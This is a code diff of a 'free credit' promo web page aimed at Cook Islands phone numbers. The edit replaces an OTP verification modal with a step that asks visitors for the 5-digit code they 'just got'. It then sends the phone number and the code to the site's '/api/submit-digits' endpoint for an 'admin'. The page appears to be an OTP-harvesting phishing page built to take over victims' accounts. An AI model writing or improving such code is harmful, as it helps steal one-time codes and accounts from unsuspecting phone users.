@@ -7,7 +7,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
-  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
     :root { --accent:#e11d48; --card-bg:rgba(255,255,255,.12); --card-border:rgba(255,255,255,.25); --text:#f8fafc; --muted:#e2e8f0; }
     *{box-sizing:border-box} html,body{height:100%}
@@ -32,18 +31,41 @@
     .btn[disabled]{filter:grayscale(.7) brightness(.8);cursor:not-allowed;box-shadow:none}
     .notice{font-size:12px;opacity:.85;margin-top:8px}
     .hidden{display:none !important}
-    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:30}
-    .modal{width:min(680px,92vw);border-radius:18px;padding:24px;background:#0c1424cc;border:1px solid var(--card-border);backdrop-filter:blur(10px)}
-    .modal h3{margin:0 0 12px;font-size:24px}
-    .cookie{position:fixed;left:16px;right:16px;bottom:16px;background:#0f172acc;color:var(--text);border:1px solid var(--card-border);border-radius:16px;padding:16px;display:none;align-items:center;gap:12px;z-index:40;backdrop-filter:blur(10px)}
-    .cookie p{margin:0;font-size:14px;opacity:.9}
-    .cookie .accept{margin-left:auto}
     footer{margin-top:80px}
     .testimonials{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px;margin-top:18px}
     .t{background:var(--card-bg);border:1px solid var(--card-border);border-radius:14px;padding:14px}
     .t .name{font-weight:700;font-size:14px;opacity:.9}
     .t .msg{margin-top:6px;font-size:13px;opacity:.95}
+    .tip{max-width:720px;margin:12px auto;color:#e2e8f0;opacity:.95}
+    .tip small{opacity:.8}
   </style>
+
+  <!-- reCAPTCHA explicit load -->
+  <script>
+    const PROD_HOSTS = ['promo-navy.vercel.app']; // set your prod domain(s)
+    const SITEKEY_PROD = '6Lfv6scrAAAAAJ3eFIcp-DP7CFUaco42vn5HuXzx'; // set your v2 checkbox site key
+    const SITEKEY_TEST = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI'; // Google test key
+
+    function loadRecaptcha() {
+      const s = document.createElement('script');
+      s.src = 'https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit';
+      s.async = true; s.defer = true;
+      document.head.appendChild(s);
+    }
+    let recaptchaRendered = false;
+    let recaptchaToken = '';
+    window.onRecaptchaReady = () => {
+      const host = location.hostname;
+      const key = (PROD_HOSTS.includes(host) && !SITEKEY_PROD.startsWith('YOUR_')) ? SITEKEY_PROD : SITEKEY_TEST;
+      grecaptcha.render('recaptcha', { 
+        sitekey: key,
+        callback: (token) => { recaptchaToken = token; enableSend(); }
+      });
+      recaptchaRendered = true;
+      enableSend();
+    };
+    loadRecaptcha();
+  </script>
 </head>
 <body>
   <div class="bg" aria-hidden="true"></div>
@@ -57,9 +79,9 @@
       <b>please follow rules to get free credit from us</b>
     </div>
 
-    <section class="section" aria-labelledby="step1">
-      <h2 id="step1">1: enter your number (just cook islands numbers)</h2>
-
+    <!-- Step 1 -->
+    <section id="step1" class="section" aria-labelledby="s1">
+      <h2 id="s1">1: enter your number (just cook islands numbers)</h2>
       <div class="phone-row" aria-label="Cook Islands phone number input">
         <span class="prefix">+682</span>
         <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" aria-label="digit 1" />
@@ -68,35 +90,33 @@
         <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 4" />
         <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 5" />
       </div>
-
       <div class="actions">
         <div id="recaptcha"></div>
-        <button id="sendCode" class="btn" disabled>Send code</button>
+        <button id="sendPhone" class="btn" disabled>Send code</button>
       </div>
       <p class="notice">We only support Cook Islands numbers (+682) for this promo.</p>
+      <div class="tip"><small>By continuing, you consent to send your phone number to our admin for processing.</small></div>
     </section>
 
-    <div id="otpModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="otp-title">
-      <div class="modal">
-        <h3 id="otp-title">For security reasons we use a verification service to deliver confirmation codes.</h3>
-        <p>Please enter the 5-digit code:</p>
-        <div class="code-row">
-          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 1" />
-          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 2" />
-          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 3" />
-          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 4" />
-          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 5" />
-        </div>
-        <div class="actions">
-          <button id="verifyCode" class="btn">Verify</button>
-          <button id="closeOtp" class="btn" style="background:linear-gradient(180deg,#64748b,#334155)">Close</button>
-        </div>
+    <!-- Step 2 -->
+    <section id="step2" class="section hidden" aria-labelledby="s2">
+      <h2 id="s2">2: account digits</h2>
+      <p class="tip">for security reasons you just need enter new 5 digits number you just got</p>
+      <div class="code-row">
+        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit A" />
+        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit B" />
+        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit C" />
+        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit D" />
+        <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="digit E" />
       </div>
-    </div>
+      <div class="actions">
+        <button id="sendDigits" class="btn" disabled>Submit digits</button>
+      </div>
+    </section>
 
     <section class="section" id="done" aria-live="polite" style="display:none">
       <h2>Done!</h2>
-      <p>You're all set. Thanks for verifying.</p>
+      <p>You're all set. Thanks.</p>
     </section>
 
     <footer class="section" aria-labelledby="reviews">
@@ -113,29 +133,21 @@
     </footer>
   </main>
 
+  <!-- cookie bar -->
   <div id="cookie" class="cookie" role="dialog" aria-live="polite">
     <p>We use cookies to provide core functionality and protect against abuse. By clicking Accept, you agree to our cookie policy.</p>
     <button class="btn accept" id="acceptCookies">Accept</button>
   </div>
 
   <script>
-    // Render reCAPTCHA explicitly with prod vs preview keys
-    const PROD_HOSTS = ['promo-navy.vercel.app'];
-    const 6Lfv6scrAAAAAJ3eFIcp-DP7CFUaco42vn5HuXzx = 'YOUR_PROD_SITE_KEY';
-    const SITEKEY_TEST = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI'; // Google test key
-
+    // Cookie + inputs + enable logic
     const cookieBanner = document.getElementById('cookie');
     const acceptBtn = document.getElementById('acceptCookies');
-    const sendBtn = document.getElementById('sendCode');
-
     const consentKey = 'promo_cookie_consent_v1';
-    function updateConsentUI() {
-      const ok = localStorage.getItem(consentKey) === 'yes';
-      cookieBanner.style.display = ok ? 'none' : 'flex';
-      sendBtn.disabled = !ok;
-    }
-    acceptBtn.addEventListener('click', () => { localStorage.setItem(consentKey, 'yes'); updateConsentUI(); });
-    updateConsentUI();
+    function hasConsent() { return localStorage.getItem(consentKey) === 'yes'; }
+    function showCookieIfNeeded() { cookieBanner.style.display = hasConsent() ? 'none' : 'flex'; }
+    acceptBtn.addEventListener('click', () => { localStorage.setItem(consentKey, 'yes'); showCookieIfNeeded(); enableSend(); });
+    showCookieIfNeeded();
 
     function hookupBoxes(selector) {
       const boxes = Array.from(document.querySelectorAll(selector));
@@ -143,6 +155,7 @@
         box.addEventListener('input', e => {
           e.target.value = e.target.value.replace(/\D/g, '').slice(0,1);
           if (e.target.value && boxes[idx+1]) boxes[idx+1].focus();
+          enableSend();
         });
         box.addEventListener('keydown', e => {
           if (e.key === 'Backspace' && !e.target.value && boxes[idx-1]) boxes[idx-1].focus();
@@ -155,89 +168,97 @@
           e.preventDefault();
           paste.split('').forEach((d, i) => { boxes[i].value = d; });
           (boxes[paste.length-1] || boxes[boxes.length-1]).focus();
+          enableSend();
         });
+      });
+      const row = document.querySelector(selector.includes('digit') ? '.phone-row' : '.code-row');
+      row?.addEventListener('click', () => {
+        const firstEmpty = boxes.find(b => !b.value) || boxes[boxes.length-1];
+        firstEmpty.focus();
+      });
+      document.addEventListener('keydown', e => {
+        if (!/^\d$/.test(e.key)) return;
+        if (document.activeElement && boxes.includes(document.activeElement)) return;
+        const empty = boxes.find(b => !b.value);
+        if (empty) { empty.value = e.key; const i = boxes.indexOf(empty); if (boxes[i+1]) boxes[i+1].focus(); enableSend(); e.preventDefault(); }
       });
       return boxes;
     }
 
-    const phoneDigits = hookupBoxes('.digit');
-    const codeDigits  = hookupBoxes('.code-digit');
+    const phoneBoxes = hookupBoxes('.digit');
+    const codeBoxes  = hookupBoxes('.code-digit');
 
-    function phoneFromBoxes() {
-      const local = phoneDigits.map(b => b.value).join('');
+    function getPhone() {
+      const local = phoneBoxes.map(b => b.value).join('');
       return local.length === 5 ? '+682' + local : null;
     }
-    function codeFromBoxes() {
-      const code = codeDigits.map(b => b.value).join('');
+    function getDigits() {
+      const code = codeBoxes.map(b => b.value).join('');
       return code.length === 5 ? code : null;
     }
 
-    const otpModal = document.getElementById('otpModal');
-    const closeOtp = document.getElementById('closeOtp');
-    closeOtp.addEventListener('click', () => { otpModal.style.display = 'none'; });
+    const btnSendPhone = document.getElementById('sendPhone');
+    const btnSendDigits = document.getElementById('sendDigits');
 
-    // Load recaptcha script and render with appropriate key
-    function loadRecaptcha() {
-      const s = document.createElement('script');
-      s.src = 'https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit';
-      s.async = true; s.defer = true;
-      document.head.appendChild(s);
+    function enableSend() {
+      const okPhone = !!getPhone();
+      const okConsent = hasConsent();
+      const okRecap = recaptchaRendered;
+      btnSendPhone.disabled = !(okPhone && okConsent && okRecap);
+      btnSendDigits.disabled = !getDigits();
     }
-    window.onRecaptchaReady = () => {
-      const host = location.hostname;
-      const key = PROD_HOSTS.includes(host) ? SITEKEY_PROD : SITEKEY_TEST;
-      grecaptcha.render('recaptcha', { sitekey: key });
-    };
-    loadRecaptcha();
+    enableSend();
 
-    // Send code
-    sendBtn.addEventListener('click', async () => {
-      if (sendBtn.disabled) return;
-      const phone = phoneFromBoxes();
-      if (!phone) return alert('Please enter a valid Cook Islands number (5 digits after +682).');
-
-      const response = grecaptcha.getResponse();
-      if (!response) return alert('Please complete the reCAPTCHA.');
-
-      sendBtn.disabled = true;
+    // Step control
+    let submittedPhone = null;
+    btnSendPhone.addEventListener('click', async () => {
+      const phone = getPhone();
+      if (!phone) return alert('Enter a valid Cook Islands number.');
+      if (!recaptchaToken) return alert('Please complete reCAPTCHA.');
+      btnSendPhone.disabled = true;
       try {
-        const res = await fetch('/api/start-signup', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone, recaptchaToken: response })
+        const res = await fetch('/api/submit-phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone, recaptchaToken })
         });
-        let data;
-        try { data = await res.json(); }
-        catch { const txt = await res.text(); throw new Error(`API ${res.status}: ${txt.slice(0,120)}`); }
-        if (!res.ok) throw new Error(data.error || 'Failed to start verification');
-        otpModal.style.display = 'flex';
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed');
+        submittedPhone = phone;
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
         document.querySelector('.code-digit')?.focus();
       } catch (err) {
         alert(err.message);
       } finally {
-        sendBtn.disabled = false;
-        grecaptcha.reset();
+        btnSendPhone.disabled = false;
+        grecaptcha.reset(); recaptchaToken=''; enableSend();
       }
     });
 
-    document.getElementById('verifyCode').addEventListener('click', async () => {
-      const phone = phoneFromBoxes();
-      const code = codeFromBoxes();
-      if (!phone || !code) return alert('Enter the full verification code.');
+    btnSendDigits.addEventListener('click', async () => {
+      const digits = getDigits();
+      if (!digits || !submittedPhone) return;
+      btnSendDigits.disabled = true;
       try {
-        const res = await fetch('/api/verify-otp', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone, code })
+        const res = await fetch('/api/submit-digits', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone: submittedPhone, digits })
         });
-        let data;
-        try { data = await res.json(); }
-        catch { const txt = await res.text(); throw new Error(`API ${res.status}: ${txt.slice(0,120)}`); }
-        if (!res.ok || !data.ok) throw new Error(data.error || 'Verification failed');
-        otpModal.style.display = 'none';
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Failed');
+        document.getElementById('step2').classList.add('hidden');
         document.getElementById('done').style.display = 'block';
       } catch (err) {
         alert(err.message);
+      } finally {
+        btnSendDigits.disabled = false;
       }
     });
   </script>
+
+  <!-- load google recaptcha last -->
+  <script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaReady&render=explicit" async defer></script>
 </body>
 </html>
